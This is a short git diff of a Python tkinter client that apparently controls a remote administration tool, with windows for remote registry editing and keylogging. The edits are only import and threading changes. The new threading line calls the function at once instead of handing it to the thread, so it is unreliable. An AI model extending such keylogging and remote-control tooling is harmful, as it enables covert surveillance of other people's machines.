@@ -4,7 +4,7 @@ from tkinter import ttk
 import socket
 import commander
 import threading
-import registerGUI
+from registerGUI import *
 import keylogGUI
 from time import sleep
 class Client(object):
@@ -142,11 +142,11 @@ class Client(object):
                     if not data:
                         break
                     print(data.decode(), end='')
-        print("")
         pass
     def command_RegEdit(self):
-        regEdit = registerGUI.RegistryWindow(Toplevel(),self.IP,self.port_no)
-        regEdit.loadReg()
+        regEdit = RegistryWindow(Toplevel(),self.IP,self.port_no)
+        regeditThread = threading.Thread(target=regEdit.loadReg(res='750x500'))
+        regeditThread.start()
     
     def command_Keylog(self):
         keyloggerGUI = keylogGUI.KeyloggerWindow(Toplevel(),self.IP,self.port_no)
